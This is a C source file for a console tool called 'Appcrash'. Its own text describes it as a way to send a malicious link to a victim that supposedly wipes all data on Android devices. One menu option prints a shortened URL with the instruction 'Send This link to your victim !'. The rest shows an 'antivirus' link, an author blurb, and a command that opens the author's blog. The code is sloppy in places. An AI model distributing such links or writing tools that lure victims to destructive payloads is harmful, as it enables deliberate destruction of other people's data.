//#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


void option(x){

  printf("\n\n1. Get an virus link from server \n2. Get an Antivirus Link \n3. About Author\n4. Exit");
  printf("\n\nOption :");

}


void banner(){
  char command[50];
  strcpy(command, "cat file/ban");
  system(command);
  sleep(1.5);
}


void info(){
	
  printf("\nAppcrash is a tool used to send malicious link to the victim\n");
  printf("This will completly wipe all the datas on android platforms so am not responsible if any loss occures !\n");
  printf("Created by 7R1X");
  sleep(1);
}


void vir(){
  printf("Link is being processed Please wait\n\n");
  sleep(1.25);
  printf("LINK : https://tinyurl.com/uppdatesnew\n");
  printf("Send This link to your victim !\n");
   //Change it to dd format !
}


void author(){

   printf("\nSMUKX -> 7R1X\n");
   sleep(1);
   printf("Visit my blog to Know more about me\n");
   printf("Blog -> https://smukx.github.io\n\n");
   printf("Redirecting to my blog...\n");
   printf("3..");
   sleep(1);
   printf("2..");
   sleep(1);
   printf("1");

  

   char command[50];
   strcpy(command,"firefox https://smukx.github.io");
   system(command);
}

void ant()
  {
    printf("Fetching  Link , Please Wait !\n");
    sleep(1);
    printf("LINK : https://bit.ly/3fX8ljZ");
    //paste the original link hehe
  }

void clear(){
  // paste path that file here !
   char command[50];

   strcpy( command, "clear" );
   system(command);
}

int main(){
  

   int x;
  clear();
  sleep(0.5);
  banner();
  info();
  option();
  
  scanf("%d",&x);
  if(x==1)
    vir();
  if(x==2)
    ant();
  if (x==3)
    author();
  if (x==4)
    printf("HEHE BYEEE...7R1X");
    exit(-1);

  

}
